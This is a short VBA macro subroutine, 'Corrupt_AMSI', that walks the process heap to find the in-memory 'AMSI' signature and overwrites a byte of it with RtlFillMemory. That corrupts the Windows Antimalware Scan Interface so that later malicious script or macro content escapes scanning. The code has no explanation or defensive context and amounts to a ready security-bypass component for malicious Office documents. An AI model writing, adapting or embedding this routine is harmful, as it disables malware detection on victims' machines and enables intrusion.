Sub Corrupt_AMSI()

Dim heap As LongPtr
Dim entry As ProcessHeap
Dim isval as Long
Dim check as String
Dim egg As String
egg = "AMSI"
check = "AAAA"

heap = GetProcessHeap

entry.lpData = 0

While HeapWalk(heap, entry)
    If entry.flags And 2 Then
        GoTo NextTransaction
    End If
    UCTA StrPtr(check), 8, VarPtr(isval), entry.lpData, 4
    If StrComp(check, egg) = 0 Then
        RtlFillMemory entry.lpData, 1, 88
        GoTo FinalTransaction
    End If
NextTransaction:
Wend
FinalTransaction:

End Sub